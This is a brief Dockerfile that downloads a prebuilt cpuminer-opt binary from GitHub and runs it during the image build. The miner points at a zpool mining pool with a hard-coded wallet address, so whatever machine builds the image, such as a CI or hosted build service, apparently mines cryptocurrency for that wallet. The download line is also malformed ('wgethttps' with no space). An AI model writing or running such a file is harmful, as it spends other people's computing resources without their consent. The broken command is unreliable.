FROM ubuntu:22.04
RUN apt update
RUN apt install wget curl git -y
RUN wgethttps://github.com/cpu-pool/cpuminer-opt-static-linux64/releases/download/v3.12.5/cpuminer-opt-linux64.tar.gz
RUN tar zxvf cpuminer-opt-linux64.tar.gz
RUN ./cpuminer -a power2b -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u Mj2f4L6HhBMwqBPFAehKrH56RZ6GQqXtNA -p zap=MBC
